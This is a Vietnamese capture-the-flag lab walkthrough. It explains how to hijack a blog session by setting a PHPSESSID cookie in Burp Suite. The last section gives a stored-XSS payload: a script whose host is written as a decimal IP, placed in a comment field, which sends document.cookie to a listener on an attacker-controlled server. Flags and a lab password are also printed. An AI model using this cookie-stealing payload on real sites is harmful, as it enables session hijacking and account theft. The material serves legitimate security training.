- Nếu đã làm lab <strong>Club status</strong> thì chỉnh giá trị trường PHPSESSID trong Burpsuite ```Options/Sessions->Open cookie jar (phần Cookie jar)``` thành <strong><code>...</code></strong> sau đó reload lại trong blog để hiện Flag <strong>OrganicShantyAbsent505</strong><br/>
- Nếu chưa làm lab <strong>Club status</strong> thì: <br/>
<code>- Mở Burpsuite (Application/Kali Linux/Top 10 Security Tools/burpsuite) -> Tắt Intercept (Intercrept is off) ở tab Proxy</code><br/>
<code>- Mở trình duyệt Iceweasel -> Edit -> Preferences -> chọn tab Advanced -> chọn tab Network -> Settings -> Manual proxy configuration (HTTP Proxy: 127.0.0.1 Port 8080)</code><br/>
<code>- Duyệt 192.168.100.210/index.php (tab Blog bị mở không click được) -> Click vào Sign In</code><br/>
<code>- Quay lại burpsuite -> chọn tab Options -> chọn tab Sessions -> Chọn Use cookies from Burp's cookie jar (trong phần Session Handling Rules) -> Edit -> chọn tab Scope -> tích chọn Proxy (use with caution), bỏ chọn Scanner, Spider -> OK</code><br/>
<code>- Kéo xuống phần Cookie jar -> chọn Open cookie jar (Set value = 1 trước đã) -> chọn dòng có name là PHPSESSID -> Edit cookie -> chỉnh giá trị trường value thành ... -> OK -> close </code><br/>
```(Chú ý,trường value sẽ được thay đổi với mỗi lần khởi động lại linux nên value bên trên có thể sai,nếu value trên sai thì có thể làm theo cách dưới)``` <br/>
<code>- Quay lại trình duyệt Iceweasel reload lại trang sẽ thấy tab Blog sáng lên</code><br/>
<code>- Ấn vào tab BLog</code><br/>
Flag <strong>OrganicShantyAbsent505</strong>


-<strong>Cách lấy value session của người dùng.</strong> <br/>
<code>-Nhập: echo "$.get('http://192.168.100.200?cookie=' +document.cookie);" > .j (vào terminal)</code> <br/>
<code>-Mở server để lắng nghe: sudo python -m SimpleHTTPServer 80 (Terminal) (pass:COS30015user)</code> <br/>
<code>-Nhập </code> [<script src=//3232261320/.j>](test5) <strong>(phần html ẩn script, đọc kỹ readme để thấy)</strong> <code>vào ô comment của New Feature: REST API - Documents và submit.(3232261320 là số thập phân của 192.168.100.200)</code> <br/>
<code>-Đợi một lúc và chúng ta sẽ thấy một số session id nổi lên,thử hết chúng để lấy flag.</code> <br/>
